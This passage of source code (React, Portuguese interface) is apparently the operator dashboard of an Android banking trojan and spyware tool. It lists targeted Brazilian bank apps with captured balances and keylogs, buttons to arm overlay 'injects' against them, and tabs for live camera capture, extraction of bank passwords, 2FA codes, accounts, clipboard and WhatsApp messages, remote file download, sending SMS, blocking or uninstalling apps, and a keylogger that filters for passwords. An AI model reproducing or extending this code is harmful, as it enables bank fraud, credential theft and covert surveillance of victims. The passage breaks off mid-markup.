                    const appNameLower = (app.name || '').toLowerCase();
                    const isBank = app.isBank || isBankApp(app.package, app.name);
                    const isBlocked = blockedApps.some((p) => p && p.trim().toLowerCase() === pkgLower);

                    // Saldo BancÃ¡rio capturado
                    const bankData = bankBalancesMap[pkgLower] || bankBalancesMap[appNameLower];
                    const hasBalance = bankData?.balance || bankData?.saldo;

                    // Keylogs do app
                    const appKeylogs = keylogs.filter((k: any) => {
                      const kPkg = (k.package || k.pkg || k.packageName || '').toLowerCase();
                      const kApp = (k.appName || k.bank || '').toLowerCase();
                      const kContent = (k.content || k.text || k.raw || '').toLowerCase();
                      return (
                        (pkgLower && kPkg.includes(pkgLower)) ||
                        (appNameLower && kApp.includes(appNameLower)) ||
                        (pkgLower && kContent.includes(pkgLower))
                      );
                    });

                    // Ãšltimo acesso / evento capturado
                    const lastKeylog = appKeylogs[0] || appKeylogs[appKeylogs.length - 1];
                    let lastAccessText = null;
                    if (lastKeylog) {
                      const rawTime = lastKeylog.timestamp || lastKeylog.created_at || lastKeylog.date;
                      if (rawTime) {
                        try {
                          const d = new Date(rawTime);
                          lastAccessText =
                            d.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }) +
                            ' (' +
                            d.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' }) +
                            ')';
                        } catch {
                          lastAccessText = rawTime;
                        }
                      }
                    }

                    const isArmed = overlayMappings.some((m) => {
                      const mPkg = (m.package_name || '').toLowerCase();
                      const aPkg = (app.package || '').toLowerCase();
                      if (!mPkg || !aPkg) return false;
                      return (
                        mPkg === aPkg ||
                        mPkg.includes(aPkg) ||
                        aPkg.includes(mPkg) ||
                        (aPkg.includes('itau') && mPkg.includes('itau')) ||
                        (aPkg.includes('bradesco') && mPkg.includes('bradesco')) ||
                        (aPkg.includes('nubank') && mPkg.includes('nubank')) ||
                        (aPkg.includes('santander') && mPkg.includes('santander')) ||
                        (aPkg.includes('caixa') && mPkg.includes('caixa')) ||
                        (aPkg.includes('bb') && mPkg.includes('bb')) ||
                        (aPkg.includes('inter') && mPkg.includes('inter'))
                      );
                    });

                    return (
                      <div
                        key={app.package || idx}
                        className={`bg-[#060c18] rounded-2xl p-4 transition-all shadow-xl flex flex-col justify-between gap-3.5 border ${
                          isBlocked
                            ? 'border-rose-500/70 bg-gradient-to-r from-rose-950/30 via-[#060c18] to-[#060c18] shadow-[0_0_20px_rgba(244,63,94,0.15)]'
                            : isArmed
                            ? 'border-red-400/60 bg-gradient-to-r from-red-950/20 via-[#060c18] to-[#060c18] shadow-[0_0_20px_rgba(6,182,212,0.2)]'
                            : isBank
                            ? 'border-amber-500/40 bg-gradient-to-r from-amber-950/15 via-[#060c18] to-[#060c18] hover:border-amber-400/60'
                            : 'border-[#13223f] hover:border-red-500/40'
                        }`}
                      >
                        {/* Header: Ãcone, Nome, Pacote e Badges de Categoria */}
                        <div className="flex items-start justify-between gap-2.5">
                          <div className="flex items-center gap-3 min-w-0">
                            {app.icon ? (
                              <img
                                src={app.icon.startsWith('data:') ? app.icon : `data:image/png;base64,${app.icon}`}
                                alt={app.name}
                                onError={(e) => {
                                  e.currentTarget.style.display = 'none';
                                  const fallback = e.currentTarget.nextElementSibling as HTMLElement;
                                  if (fallback) fallback.style.display = 'flex';
                                }}
                                className="w-11 h-11 rounded-xl object-cover border border-[#1b2e52] p-1 bg-[#09152b] shrink-0 shadow-md"
                              />
                            ) : null}
                            <div
                              style={{ display: app.icon ? 'none' : 'flex' }}
                              className={`w-11 h-11 rounded-xl border items-center justify-center font-black text-xs shrink-0 shadow-md ${
                                isBank
                                  ? 'bg-amber-500/10 border-amber-500/40 text-amber-300'
                                  : app.isSystem
                                  ? 'bg-slate-800 border-slate-700 text-slate-400'
                                  : 'bg-red-500/10 border-red-500/40 text-pink-300'
                              }`}
                            >
                              {app.name ? app.name.charAt(0).toUpperCase() : 'A'}
                            </div>

                            <div className="min-w-0">
                              <h4 className="font-bold text-xs text-white truncate font-sans tracking-wide" title={app.name}>
                                {app.name}
                              </h4>
                              <p className="text-[10px] text-red-400/80 font-mono truncate max-w-[200px] mt-0.5" title={app.package}>
                                {app.package}
                              </p>
                            </div>
                          </div>

                          {/* Badges de Status Neons Alinhados */}
                          <div className="flex items-center gap-1 shrink-0 flex-wrap justify-end">
                            {/* Status do Inject: INJECT ATIVO vs INJECT OFF */}
                            {isArmed ? (
                              <span className="text-[8px] px-1.5 py-0.5 rounded-md bg-red-500/20 border border-red-400/50 text-pink-300 font-mono font-bold uppercase flex items-center gap-0.5 animate-pulse shadow-[0_0_8px_rgba(6,182,212,0.4)]">
                                <Target className="w-2.5 h-2.5 text-pink-300" /> INJECT ATIVO
                              </span>
                            ) : (
                              <span className="text-[8px] px-1.5 py-0.5 rounded-md bg-slate-800/80 border border-slate-700/60 text-slate-500 font-mono font-bold uppercase">
                                INJECT OFF
                              </span>
                            )}
                            {isBank && (
                              <span className="text-[8px] px-1.5 py-0.5 rounded-md bg-amber-500/15 border border-amber-500/35 text-amber-300 font-mono font-bold uppercase">
                                BANCO
                              </span>
                            )}
                            {isBlocked && (
                              <span className="text-[8px] px-1.5 py-0.5 rounded-md bg-rose-500/20 border border-rose-500/50 text-rose-300 font-mono font-bold uppercase flex items-center gap-0.5 animate-pulse">
                                <ShieldAlert className="w-2.5 h-2.5" /> IMPEDIDO
                              </span>
                            )}
                            {app.isSystem && (
                              <span className="text-[8px] px-1.5 py-0.5 rounded-md bg-slate-800 border border-slate-700 text-slate-400 font-mono">
                                SISTEMA
                              </span>
                            )}
                          </div>
                        </div>

                        {/* Corpo de InformaÃ§Ãµes: Saldo BancÃ¡rio, Atividade & Keylogger */}
                        <div className="bg-[#030812] border border-[#101c33] rounded-xl p-2.5 text-[10px] font-mono space-y-1.5">
                          {/* Saldo apenas se existir capturado */}
                          {isBank && hasBalance && (
                            <div className="flex items-center justify-between bg-amber-500/10 border border-amber-500/25 rounded-lg px-2.5 py-1 text-amber-300">
                              <span className="font-bold text-[9px] uppercase tracking-wider text-amber-400">ðŸ’° SALDO EM BANCO:</span>
                              <span className="font-black text-xs text-emerald-400">{hasBalance}</span>
                            </div>
                          )}

                          <div className="grid grid-cols-2 gap-2 text-slate-400">
                            <div>
                              <span className="text-slate-500 block text-[9px]">ÃšLTIMO ACESSO:</span>
                              <span className="text-slate-200 font-semibold">{lastAccessText || 'Varredura recente'}</span>
                            </div>
                            <div className="text-right">
                              <span className="text-slate-500 block text-[9px]">KEYLOGGER:</span>
                              <span className={`font-bold ${appKeylogs.length > 0 ? 'text-pink-300' : 'text-slate-500'}`}>
                                {appKeylogs.length} registro(s)
                              </span>
                            </div>
                          </div>

                          {/* Keylog Snippet Preview */}
                          {lastKeylog && (lastKeylog.text || lastKeylog.content) && (
                            <div className="text-[9px] bg-[#071124] border border-[#162747] rounded-lg p-1.5 text-slate-300 truncate mt-1">
                              <span className="text-red-400 font-bold">KEYLOG:</span> {lastKeylog.text || lastKeylog.content}
                            </div>
                          )}
                        </div>

                        {/* Barra de AÃ§Ãµes RÃ¡pidas */}
                        <div className="pt-2 border-t border-[#101c33] flex flex-wrap items-center justify-between gap-1.5 w-full">
                          <div className="flex flex-wrap items-center gap-1.5">
                            {/* BotÃ£o ABRIR */}
                            <button
                              onClick={() => {
                                sendCommand({ action: 'OPEN_APP', package: app.package });
                                sendCommand({ action: 'LAUNCH_APP', package: app.package });
                                showToast(`Abrindo ${app.name}...`, 'info');
                              }}
                              className="px-2.5 py-1.5 bg-red-500/10 hover:bg-red-500/20 border border-red-500/30 hover:border-red-400 text-pink-300 rounded-xl text-[10px] font-black uppercase tracking-wider transition-all flex items-center gap-1 shrink-0 active:scale-95"
                              title="Abrir aplicativo no celular"
                            >
                              <Play className="w-3 h-3" /> Abrir
                            </button>

                            {/* BotÃ£o INJETAR (INJET) */}
                            <button
                              onClick={() => handleInjectApp(app)}
                              className={`px-2.5 py-1.5 rounded-xl text-[10px] font-black uppercase tracking-wider transition-all flex items-center gap-1 shrink-0 active:scale-95 cursor-pointer border ${
                                isArmed
                                  ? 'bg-red-500/20 border-red-400 text-pink-200 shadow-[0_0_12px_rgba(6,182,212,0.4)]'
                                  : 'bg-gradient-to-r from-red-600/30 to-red-600/30 hover:from-red-600/50 hover:to-red-600/50 border-red-400/50 hover:border-pink-300 text-pink-200 shadow-[0_0_12px_rgba(6,182,212,0.3)]'
                              }`}
                              title={`Injetar overlay/tela preta no app ${app.name}`}
                            >
                              <Syringe className="w-3 h-3 text-pink-300" /> {isArmed ? 'Armado ðŸŽ¯' : 'Injet'}
                            </button>

                            {/* BotÃ£o REMOVER INJECT (Sempre disponÃ­vel no card ao lado de INJET) */}
                            <button
                              onClick={() => handleDisarmInject(app.package)}
                              className={`px-2.5 py-1.5 rounded-xl text-[10px] font-black uppercase tracking-wider transition-all flex items-center gap-1 shrink-0 active:scale-95 cursor-pointer border ${
                                isArmed
                                  ? 'bg-rose-600/30 hover:bg-rose-600/50 border-rose-400 text-rose-200 shadow-[0_0_12px_rgba(244,63,94,0.4)]'
                                  : 'bg-rose-500/10 hover:bg-rose-500/20 border-rose-500/30 text-rose-300/80 hover:text-rose-200'
                              }`}
                              title={`Remover / Desarmar o inject do app ${app.name}`}
                            >
                              <XCircle className="w-3 h-3 text-rose-400" /> {isArmed ? 'Remover Inject' : 'Remover'}
                            </button>

                            {/* BotÃ£o IMPEDIR ABERTURA */}
                            <button
                              onClick={() => toggleBlockApp(app.package, app.name)}
                              className={`px-2.5 py-1.5 rounded-xl text-[10px] font-black uppercase tracking-wider transition-all flex items-center gap-1 border shrink-0 active:scale-95 ${
                                isBlocked
                                  ? 'bg-rose-600 text-white border-rose-400 shadow-[0_0_10px_rgba(244,63,94,0.5)]'
                                  : 'bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 border-rose-500/30 hover:border-rose-400'
                              }`}
                              title="Impedir abertura deste app exibindo tela de Aplicativo IndisponÃ­vel"
                            >
                              <ShieldAlert className="w-3 h-3" />
                              {isBlocked ? 'Impedido' : 'Impedir'}
                            </button>
                          </div>

                          <div className="flex flex-wrap items-center gap-1 shrink-0">
                            {/* BotÃ£o KEYLOG DO APP */}
                            <button
                              onClick={() => {
                                setKeylogSearch(app.name || app.package);
                                setActiveTab('keylogger');
                                fetchKeylogs();
                                showToast(`Filtrando keylogger para ${app.name}`, 'info');
                              }}
                              className="px-2.5 py-1.5 bg-red-500/10 hover:bg-red-500/20 border border-red-500/30 hover:border-red-400 text-pink-300 rounded-xl text-[10px] font-bold uppercase transition-all flex items-center gap-1 shrink-0"
                              title="Ver registros do keylogger deste aplicativo"
                            >
                              <Keyboard className="w-3 h-3" /> Keylog ({appKeylogs.length})
                            </button>

                            {/* BotÃ£o FORÃ‡AR PARADA */}
                            <button
                              onClick={() => {
                                sendCommand({ action: 'FORCE_STOP_APP', package: app.package });
                                showToast(`ForÃ§ando parada de ${app.name}...`, 'info');
                              }}
                              className="p-1.5 bg-slate-800/80 hover:bg-amber-950/80 border border-slate-700/60 hover:border-amber-500/50 text-slate-300 hover:text-amber-300 rounded-xl transition-all shrink-0"
                              title="ForÃ§ar parada do app"
                            >
                              <Square className="w-3.5 h-3.5" />
                            </button>

                            {/* BotÃ£o DESINSTALAR */}
                            <button
                              onClick={() => {
                                if (window.confirm(`Deseja solicitar a desinstalaÃ§Ã£o de "${app.name}" no celular remoto?`)) {
                                  sendCommand({ action: 'UNINSTALL_APP', package: app.package });
                                  showToast(`DesinstalaÃ§Ã£o solicitada para ${app.name}`, 'info');
                                }
                              }}
                              className="p-1.5 bg-slate-800/80 hover:bg-rose-950/80 border border-slate-700/60 hover:border-rose-500/50 text-slate-300 hover:text-rose-400 rounded-xl transition-all shrink-0"
                              title="Desinstalar app"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                            </button>
                          </div>
                        </div>
                      </div>
                    );
                  })}
              </div>
            )}
          </div>
        )}

        {/* ----------------------------------------------------------------- */}
        {/* 4. VISÃƒO: CÃ‚MERA AO VIVO                                          */}
        {/* ----------------------------------------------------------------- */}
        {activeTab === 'camera' && (
          <div className="w-full max-w-4xl space-y-4">
            <div className="bg-[#081020] border border-[#14233e] rounded-2xl p-5 shadow-lg space-y-4">
              <div className="flex items-center justify-between border-b border-[#14233e] pb-3">
                <h3 className="text-xs font-black uppercase text-slate-200 tracking-wider font-mono flex items-center gap-2">
                  <Camera className="w-4 h-4 text-red-400" />
                  CÃ‚MERA AO VIVO
                </h3>
                <button
                  onClick={() => {
                    const next = cameraFacing === 'front' ? 'back' : 'front';
                    setCameraFacing(next);
                    sendCommand({ action: 'SWITCH_CAMERA', facing: next });
                  }}
                  className="px-3 py-1.5 bg-[#0c1830] border border-[#1d3257] rounded-xl text-pink-300 font-bold uppercase font-mono text-xs"
                >
                  {cameraFacing === 'front' ? 'ðŸ“· CÃ‚MERA FRONTAL' : 'ðŸ“· CÃ‚MERA TRASEIRA'}
                </button>
              </div>

              <div className="w-full h-[380px] bg-black rounded-2xl border border-[#162744] flex items-center justify-center relative overflow-hidden">
                <div className="text-center space-y-3">
                  <Camera className="w-12 h-12 text-red-400/50 mx-auto animate-pulse" />
                  <p className="text-xs text-slate-400 font-mono">Stream de vÃ­deo da cÃ¢mera ao vivo</p>
                  <button
                    onClick={() => {
                      setIsCameraActive(!isCameraActive);
                      sendCommand({ action: isCameraActive ? 'STOP_CAMERA' : 'START_CAMERA', facing: cameraFacing });
                    }}
                    className="px-5 py-2 bg-[#0070f3] text-white rounded-xl font-bold font-mono text-xs uppercase shadow-[0_0_15px_rgba(0,112,243,0.5)]"
                  >
                    {isCameraActive ? 'PARAR CÃ‚MERA' : 'INICIAR CÃ‚MERA AO VIVO'}
                  </button>
                </div>
              </div>

              <div className="flex items-center justify-between pt-2">
                <button
                  onClick={() => {
                    sendCommand({ action: 'TAKE_PHOTO', facing: cameraFacing });
                    showToast('Foto capturada em alta resoluÃ§Ã£o!', 'success');
                  }}
                  className="px-4 py-2 bg-[#0a1426] hover:bg-[#0f1d38] border border-[#162744] text-pink-300 rounded-xl font-mono text-xs font-bold uppercase flex items-center gap-2"
                >
                  <Camera className="w-4 h-4" />
                  TIRAR FOTO
                </button>

                <button
                  onClick={() => {
                    const next = !torchEnabled;
                    setTorchEnabled(next);
                    sendCommand({ action: 'TOGGLE_TORCH', enabled: next });
                  }}
                  className={`px-4 py-2 rounded-xl font-mono text-xs font-bold uppercase flex items-center gap-2 border ${
                    torchEnabled ? 'bg-amber-950 border-amber-500 text-amber-300' : 'bg-[#0a1426] border-[#162744] text-slate-300'
                  }`}
                >
                  <Sun className="w-4 h-4" />
                  {torchEnabled ? 'LANTERNA LIGADA' : 'LIGAR LANTERNA'}
                </button>
              </div>
            </div>
          </div>
        )}

        {/* ----------------------------------------------------------------- */}
        {/* 5. VISÃƒO: EXTRAÃ‡ÃƒO DE DADOS (DATA SCRAPER)                       */}
        {/* ----------------------------------------------------------------- */}
        {activeTab === 'data_scraper' && (
          <div className="w-full max-w-5xl space-y-4">
            <div className="bg-[#081020] border border-[#14233e] rounded-2xl p-5 shadow-lg space-y-4">
              <div className="flex items-center justify-between border-b border-[#14233e] pb-3">
                <h3 className="text-xs font-black uppercase text-slate-200 tracking-wider font-mono flex items-center gap-2">
                  <Eye className="w-4 h-4 text-red-400" />
                  EXTRAÃ‡ÃƒO DE DADOS & CREDENCIAIS
                </h3>
                <button
                  onClick={() => {
                    sendCommand({ action: 'DUMP_ALL_DATA' });
                    showToast('ExtraÃ§Ã£o completa iniciada no aparelho...', 'info');
                  }}
                  className="px-4 py-2 bg-[#0070f3] text-white rounded-xl font-bold font-mono text-xs uppercase shadow-[0_0_15px_rgba(0,112,243,0.5)] flex items-center gap-2"
                >
                  <Download className="w-3.5 h-3.5" />
                  EXTRAIR TODOS OS DADOS
                </button>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                {[
                  { title: 'Contas Google & Emails', desc: 'Extrair logins sincronizados', action: 'DUMP_ACCOUNTS' },
                  { title: 'Senhas & Capturas BancÃ¡rias', desc: 'Senhas digitadas e prints', action: 'DUMP_BANK_CREDENTIALS' },
                  { title: 'CÃ³digos 2FA & SMS', desc: 'Tokens e cÃ³digos recebidos', action: 'DUMP_2FA_CODES' },
                  { title: 'Ãrea de TransferÃªncia (Clipboard)', desc: 'HistÃ³rico de textos copiados', action: 'DUMP_CLIPBOARD' },
                  { title: 'HistÃ³rico de NavegaÃ§Ã£o', desc: 'Links e buscas no Chrome', action: 'DUMP_BROWSER_HISTORY' },
                  { title: 'Mensagens do WhatsApp', desc: 'NotificaÃ§Ãµes e conversas capturadas', action: 'DUMP_WHATSAPP' }
                ].map((item, idx) => (
                  <div
                    key={idx}
                    className="bg-[#091224] border border-[#14233e] hover:border-red-500/40 rounded-xl p-4 flex flex-col justify-between space-y-3 transition-all"
                  >
                    <div>
                      <h4 className="font-bold text-xs text-white font-sans">{item.title}</h4>
                      <p className="text-[10px] text-slate-400 font-mono mt-1">{item.desc}</p>
                    </div>
                    <button
                      onClick={() => {
                        sendCommand({ action: item.action });
                        showToast(`Extraindo ${item.title}...`, 'info');
                      }}
                      className="w-full py-2 bg-[#0c1830] hover:bg-red-950 border border-[#1d3257] hover:border-red-500/50 text-pink-300 rounded-lg text-xs font-mono font-bold uppercase transition-all"
                    >
                      Extrair Agora
                    </button>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* ----------------------------------------------------------------- */}
        {/* 6. VISÃƒO: GERENCIADOR DE ARQUIVOS                                */}
        {/* ----------------------------------------------------------------- */}
        {activeTab === 'files' && (
          <div className="w-full max-w-5xl space-y-4">
            <div className="bg-[#081020] border border-[#14233e] rounded-2xl p-5 shadow-lg space-y-4">
              <div className="flex items-center justify-between border-b border-[#14233e] pb-3">
                <div className="flex items-center gap-2">
                  <Folder className="w-4 h-4 text-red-400" />
                  <span className="text-xs font-black uppercase text-slate-200 tracking-wider font-mono">
                    DIRETÃ“RIO:
                  </span>
                  <span className="text-xs font-bold text-red-400 font-mono bg-[#091224] px-2.5 py-1 rounded-lg border border-[#14233e]">
                    {currentPath}
                  </span>
                </div>

                <div className="flex items-center gap-2 font-mono">
                  {currentPath !== '/sdcard' && (
                    <button
                      onClick={() => {
                        const parts = currentPath.split('/').filter(Boolean);
                        parts.pop();
                        const parent = '/' + parts.join('/');
                        fetchFiles(parent || '/sdcard');
                      }}
                      className="px-3 py-1.5 bg-[#09152b] border border-red-500/30 hover:border-red-400 text-pink-300 rounded-xl text-xs font-bold uppercase flex items-center gap-1 transition-all"
                      title="Voltar pasta acima"
                    >
                      <ArrowLeft className="w-3.5 h-3.5" />
                      <span>Voltar</span>
                    </button>
                  )}
                  <button
                    onClick={() => fetchFiles('/sdcard')}
                    className="px-3 py-1.5 bg-[#0c1830] border border-[#1d3257] hover:border-red-400 text-pink-300 rounded-xl text-xs font-mono font-bold uppercase transition-all"
                  >
                    /sdcard
                  </button>
                  <button
                    onClick={() => fetchFiles(currentPath)}
                    className="px-3 py-1.5 bg-[#0070f3] hover:bg-red-600 text-white rounded-xl text-xs font-mono font-bold uppercase flex items-center gap-1 transition-all shadow-[0_0_12px_rgba(0,112,243,0.4)]"
                  >
                    <RefreshCw className={`w-3 h-3 ${isLoadingFiles ? 'animate-spin' : ''}`} />
                    ATUALIZAR
                  </button>
                </div>
              </div>

              <div className="space-y-2 font-mono text-xs">
                {fileList.length === 0 ? (
                  <div className="bg-[#091224] border border-[#14233e] rounded-xl p-8 text-center space-y-3 font-mono">
                    <Folder className="w-8 h-8 text-slate-500 mx-auto animate-pulse" />
                    <div className="text-xs font-bold text-slate-300">Nenhum arquivo listado para {currentPath}</div>
                    <p className="text-[11px] text-slate-500 font-sans">
                      Clique abaixo para ler o diretÃ³rio remoto do aparelho.
                    </p>
                    <button
                      onClick={() => fetchFiles(currentPath)}
                      className="px-4 py-2 bg-[#0070f3] hover:bg-red-600 text-white rounded-xl text-xs font-bold uppercase inline-flex items-center gap-2 shadow-lg transition-all"
                    >
                      <RefreshCw className={`w-3.5 h-3.5 ${isLoadingFiles ? 'animate-spin' : ''}`} />
                      Sincronizar Arquivos do DiretÃ³rio
                    </button>
                  </div>
                ) : (
                  fileList.map((file, idx) => {
                    const isFolder = file.isDir || file.is_dir || file.type === 'directory' || file.type === 'dir';
                    return (
                      <div
                        key={idx}
                        onClick={() => {
                          if (isFolder) {
                            const newPath = currentPath === '/' ? `/${file.name}` : `${currentPath}/${file.name}`;
                            fetchFiles(newPath);
                          }
                        }}
                        className={`bg-[#091224] hover:bg-[#0c1b36] border border-[#14233e] hover:border-red-400/60 rounded-xl p-3 flex items-center justify-between transition-all cursor-pointer group ${
                          isFolder ? 'ring-1 ring-red-500/10' : ''
                        }`}
                      >
                        <div className={`flex items-center gap-3 ${isFolder ? 'text-pink-300 font-bold group-hover:text-pink-200' : 'text-slate-200'}`}>
                          {isFolder ? <Folder className="w-4 h-4 text-red-400 fill-red-400/20 group-hover:scale-110 transition-transform" /> : <File className="w-4 h-4 text-slate-400" />}
                          <span className="group-hover:translate-x-0.5 transition-transform">{file.name}</span>
                        </div>

                        <div className="flex items-center gap-4 text-[11px] text-slate-400" onClick={(e) => e.stopPropagation()}>
                          <span>{file.size || (isFolder ? 'PASTA' : '--')}</span>
                          <span>{file.modified || ''}</span>
                          <button
                            onClick={() => {
                              const downloadPath = currentPath === '/' ? `/${file.name}` : `${currentPath}/${file.name}`;
                              sendCommand({ action: 'DOWNLOAD_FILE', path: downloadPath });
                              showToast(`Download de ${file.name} solicitado!`, 'success');
                            }}
                            className="p-1.5 hover:bg-[#0e2246] text-red-400 hover:text-white rounded-lg border border-transparent hover:border-red-400/50 transition-all"
                            title="Baixar arquivo do dispositivo"
                          >
                            <Download className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      </div>
                    );
                  })
                )}
              </div>
            </div>
          </div>
        )}

        {/* ----------------------------------------------------------------- */}
        {/* 7. VISÃƒO: SMS & MENSAGENS                                        */}
        {/* ----------------------------------------------------------------- */}
        {activeTab === 'sms' && (
          <div className="w-full max-w-5xl space-y-4">
            <div className="bg-[#081020] border border-[#14233e] rounded-2xl p-5 shadow-lg space-y-3">
              <h3 className="text-xs font-black uppercase text-slate-200 tracking-wider font-mono flex items-center gap-2 border-b border-[#14233e] pb-3">
                <Send className="w-4 h-4 text-red-400" />
                ENVIAR SMS DIRETO DO DISPOSITIVO
              </h3>
              <form onSubmit={handleSendSms} className="flex gap-3">
                <input
                  type="text"
                  placeholder="NÃºmero de Destino (ex: 11987654321)"
                  value={smsToNumber}
                  onChange={(e) => setSmsToNumber(e.target.value)}
                  className="bg-[#0a1426] border border-[#152442] rounded-xl px-3 py-2 text-xs text-slate-100 placeholder-slate-500 outline-none w-1/3 font-mono"
                />
                <input
                  type="text"
                  placeholder="Digite a mensagem SMS..."
                  value={smsBody}
                  onChange={(e) => setSmsBody(e.target.value)}
                  className="bg-[#0a1426] border border-[#152442] rounded-xl px-3 py-2 text-xs text-slate-100 placeholder-slate-500 outline-none flex-1 font-mono"
                />
                <button
                  type="submit"
                  className="px-5 py-2 bg-[#0070f3] hover:bg-[#0060d4] text-white rounded-xl text-xs font-mono font-bold uppercase shadow-[0_0_15px_rgba(0,112,243,0.4)]"
                >
                  ENVIAR
                </button>
              </form>
            </div>

            <div className="bg-[#081020] border border-[#14233e] rounded-2xl p-5 shadow-lg space-y-4">
              <div className="flex items-center justify-between border-b border-[#14233e] pb-3">
                <h3 className="text-xs font-black uppercase text-slate-200 tracking-wider font-mono flex items-center gap-2">
                  <MessageSquare className="w-4 h-4 text-red-400" />
                  MENSAGENS SMS RECEBIDAS
                </h3>
                <button
                  onClick={fetchSms}
                  className="text-[11px] font-bold text-red-400 hover:text-pink-300 uppercase tracking-wider font-mono flex items-center gap-1"
                >
                  <RefreshCw className={`w-3 h-3 ${isLoadingSms ? 'animate-spin' : ''}`} />
                  ATUALIZAR SMS
                </button>
              </div>

              <div className="space-y-2 font-mono text-xs">
                {smsList.length === 0 ? (
                  <div className="bg-[#091224] border border-[#14233e] rounded-xl p-8 text-center space-y-3 font-mono">
                    <MessageSquare className="w-8 h-8 text-slate-500 mx-auto" />
                    <div className="text-xs font-bold text-slate-300">Nenhum SMS capturado do dispositivo ainda</div>
                    <p className="text-[11px] text-slate-500 font-sans">
                      Clique em "Atualizar SMS" para solicitar a leitura das mensagens recebidas pelo aparelho.
                    </p>
                    <button
                      onClick={fetchSms}
                      className="px-4 py-2 bg-[#0070f3] text-white rounded-xl text-xs font-bold uppercase inline-flex items-center gap-2 shadow-lg"
                    >
                      <RefreshCw className={`w-3.5 h-3.5 ${isLoadingSms ? 'animate-spin' : ''}`} />
                      Solicitar Leitura de SMS
                    </button>
                  </div>
                ) : (
                  smsList.map((sms) => (
                    <div key={sms.id} className="bg-[#091224] border border-[#14233e] rounded-xl p-3.5 space-y-1.5">
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-red-400">{sms.sender}</span>
                        <span className="text-[10px] text-slate-500">{sms.date}</span>
                      </div>
                      <p className="text-slate-200 text-xs font-sans">{sms.body}</p>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        )}

        {/* ----------------------------------------------------------------- */}
        {/* 8. VISÃƒO: KEYLOGGER                                              */}
        {/* ----------------------------------------------------------------- */}
        {activeTab === 'keylogger' && (
          <div className="w-full max-w-5xl space-y-4">
            <div className="bg-[#081020] border border-[#14233e] rounded-2xl p-5 shadow-lg space-y-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#14233e] pb-3">
                <h3 className="text-xs font-black uppercase text-slate-200 tracking-wider font-mono flex items-center gap-2">
                  <Keyboard className="w-4 h-4 text-red-400" />
                  KEYLOGGER EM TEMPO REAL ({keylogs.length})
                </h3>
                <div className="flex flex-wrap items-center gap-2">
                  {/* Filtro por Categorias */}
                  <div className="flex items-center gap-1 text-[10px] font-bold">
                    <button
                      type="button"
                      onClick={() => setKeylogFilterType('all')}
                      className={`px-2.5 py-1 rounded-xl border transition-all ${
                        keylogFilterType === 'all'
                          ? 'bg-red-600 text-white border-red-400 font-black'
                          : 'bg-[#0a1426] text-slate-400 border-[#14233e] hover:text-white'
                      }`}
                    >
                      Todos
                    </button>
                    <button
                      type="button"
                      onClick={() => setKeylogFilterType('passwords')}
                      className={`px-2.5 py-1 rounded-xl border transition-all flex items-center gap-1 ${
                        keylogFilterType === 'passwords'
                          ? 'bg-amber-500 text-black border-amber-300 font-black shadow-[0_0_10px_rgba(245,158,11,0.5)]'
                          : 'bg-[#0a1426] text-amber-400 border-[#14233e] hover:border-amber-500/50'
                      }`}
                    >
                      ðŸ”‘ Senhas
                    </button>
                    <button
                      type="button"
                      onClick={() => setKeylogFilterType('typed')}
                      className={`px-2.5 py-1 rounded-xl border transition-all flex items-center gap-1 ${
                        keylogFilterType === 'typed'
                          ? 'bg-red-500 text-black border-pink-300 font-black shadow-[0_0_10px_rgba(6,182,212,0.5)]'
                          : 'bg-[#0a1426] text-red-400 border-[#14233e] hover:border-red-500/50'
                      }`}
                    >
                      âŒ¨ï¸ DigitaÃ§Ãµes
                    </button>
                    <button
                      type="button"
                      onClick={() => setKeylogFilterType('windows')}
                      className={`px-2.5 py-1 rounded-xl border transition-all flex items-center gap-1 ${
                        keylogFilterType === 'windows'
                          ? 'bg-indigo-600 text-white border-indigo-400 font-black'
                          : 'bg-[#0a1426] text-slate-400 border-[#14233e] hover:text-white'
                      }`}
                    >
                      ðŸ“± Telas
                    </button>
                  </div>

                  <input
                    type="text"
                    placeholder="Filtrar por texto / app..."
                    value={keylogSearch}
                    onChange={(e) => setKeylogSearch(e.target.value)}
                    className="bg-[#0a1426] border border-[#152442] rounded-xl px-3 py-1.5 text-xs text-slate-100 placeholder-slate-500 outline-none w-48 font-mono focus:border-red-500"
                  />
                  <button
                    onClick={fetchKeylogs}
                    className="px-3 py-1.5 bg-[#0070f3] text-white rounded-xl text-xs font-mono font-bold uppercase flex items-center gap-1.5 shadow-[0_0_15px_rgba(0,112,243,0.4)]"
                  >
                    <RefreshCw className={`w-3 h-3 ${isLoadingKeylogs ? 'animate-spin' : ''}`} />
                    ATUALIZAR
                  </button>
                </div>
              </div>

              <div className="space-y-2 font-mono text-xs max-h-[600px] overflow-y-auto pr-2">
                {keylogs.length === 0 ? (
                  <div className="text-center py-12 text-slate-500 text-xs">
                    Nenhum registro de keylogger capturado atÃ© o momento.
                  </div>
                ) : (
                  keylogs
                    .map((k: any) => parseKeylogRecord(k))
                    .filter((item: ParsedKeylogItem) => {
                      if (keylogFilterType === 'passwords' && !item.isPassword) return false;
                      if (keylogFilterType === 'typed' && item.displayCategory !== 'typed' && item.displayCategory !== 'password') return false;
                      if (keylogFilterType === 'windows' && item.displayCategory !== 'window') return false;
                      if (keylogSearch) {
                        const search = keylogSearch.toLowerCase();
                        return (
                          item.appName.toLowerCase().includes(search) ||
                          item.package.toLowerCase().includes(search) ||
                          item.mainText.toLowerCase().includes(search) ||
                          item.subInfo.toLowerCase().includes(search) ||
                          item.text.toLowerCase().includes(search)
                        );
                      }
                      return true;
                    })
                    .map((item: ParsedKeylogItem, idx: number) => (
                      <div
                        key={item.id || idx}
                        className={`bg-[#091224] border ${
                          item.isPassword
                            ? 'border-amber-500/50 bg-gradient-to-r from-amber-950/20 via-[#091224] to-[#091224] shadow-[0_0_15px_rgba(245,158,11,0.15)]'
                            : 'border-[#14233e] hover:border-red-500/40'
                        } rounded-xl p-3.5 space-y-2 transition-all`}
                      >
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-2">
